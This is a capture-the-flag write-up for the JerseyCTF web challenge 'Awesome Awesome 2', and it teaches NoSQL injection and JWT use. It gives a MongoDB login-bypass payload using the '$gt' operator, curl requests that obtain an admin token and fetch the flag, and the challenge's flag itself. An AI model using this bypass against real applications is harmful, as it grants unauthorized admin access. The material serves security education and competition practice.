# Awesome Awesome 2 — JerseyCTF Writeup

**Challenge:** Awesome Awesome 2  
**Category:** web  
**Difficulty:** Easy  
**Points:** 476  
**Solves:** 36  
**Author:** Nicholas Columbus  
**Flag:** `jctf{MANG0S}`

---

## Description

> Awesome Awesome needs your help... he is in space this time! (Awesome Awesome 2: In Space). Awesome Awesome wants your help breaking into awful awful's space station as an admin account. If he doesn't do this the whole world may just blow up! Awful Awful is counting. YOU NEED to stop him. And remember, its all about the friends we make along the way.
>
> **Admin Note:** We *almost* vetoed this challenge. Sorry in advance.

---

## Background Knowledge (Read This First!)

### What is NoSQL Injection?

**NoSQL injection** exploits the way MongoDB handles query operators. Instead of injecting SQL syntax, you inject JSON operators like `$gt` (greater than) or `$ne` (not equal).

For a login check like:
```javascript
db.users.findOne({ username: req.body.username, password: req.body.password })
```

If the app passes JSON directly into the query without sanitization, sending this bypasses it:
```json
{ "username": {"$gt": ""}, "password": {"$gt": ""} }
```

This means: *find a user where username > "" AND password > ""* — which matches the first user in the database (usually admin) without knowing the password.

### What is a JWT?

A **JSON Web Token (JWT)** is a signed token for transmitting claims between parties. It has three parts:
```
eyJhbGciOiJIUzI1NiJ9 . eyJ1c2VybmFtZSI6ImFkbWluIn0 . SIGNATURE
   header (base64)         payload (base64)               HMAC
```

The server returns a JWT after login. The client sends it back with `Authorization: Bearer <token>` for subsequent requests.

---

## Solution — Step by Step

### Step 1 — Inspect the Login Page Source

Viewing the login page HTML reveals the form POSTs to `/api/login` with JSON:

```javascript
const res = await fetch('/api/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    username: document.getElementById('username').value,
    password: document.getElementById('password').value
  })
});
```

### Step 2 — Read home.html to Find the Flag Endpoint

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ curl http://awesome-awesome-2.aws.jerseyctf.com/home.html
```

The dashboard calls `/api/me` with a Bearer token and returns the flag only for admin:

```javascript
fetch('/api/me', { headers: { 'Authorization': 'Bearer ' + token } })
  .then(res => res.json())
  .then(data => {
    document.getElementById('username').textContent = data.username;
    if (data.flag) document.getElementById('flag').textContent = 'Flag: ' + data.flag;
  });
```

### Step 3 — Try Standard Credentials

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ curl -X POST http://awesome-awesome-2.aws.jerseyctf.com/api/login \
> -H "Content-Type: application/json" \
> -d '{"username":"admin","password":"admin"}'
{"error":"Invalid username or password"}
```

### Step 4 — NoSQL Injection on Login

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ curl -X POST http://awesome-awesome-2.aws.jerseyctf.com/api/login \
> -H "Content-Type: application/json" \
> -d '{"username":{"$gt":""},"password":{"$gt":""}}'
{"ok":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzc2NTM1MDcwLCJleHAiOjE3NzY2MjE0NzB9.5KX7sp1tYBQBlPFLTMAms1CxppBFgIgskuCfBKBYreE"}
```

The injection returned a JWT for the **admin** account.

### Step 5 — Use the Token to Get the Flag

```
┌──(zham㉿kali)-[/media/sf_downloads]
└─$ curl http://awesome-awesome-2.aws.jerseyctf.com/api/me \
> -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzc2NTM1MDcwLCJleHAiOjE3NzY2MjE0NzB9.5KX7sp1tYBQBlPFLTMAms1CxppBFgIgskuCfBKBYreE"
{"username":"admin","flag":"jctf{MANG0S}"}
```

---

## Flag

```
jctf{MANG0S}
```

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| `curl` | Send HTTP requests and test the API | ⭐ Easy |
| NoSQL `$gt` operator | Bypass MongoDB authentication | ⭐⭐ Medium |

---

## Key Takeaways

- **NoSQL databases are also injectable.** MongoDB's `$gt` and `$ne` operators can bypass authentication just like SQL injection does in relational databases.
- **Always read the frontend JavaScript.** `home.html` revealed exactly which endpoint returns the flag and what field to look for.
- **The JWT payload confirmed admin access.** Decoding it shows `{"username":"admin"}` — the injection matched the first user in the collection.
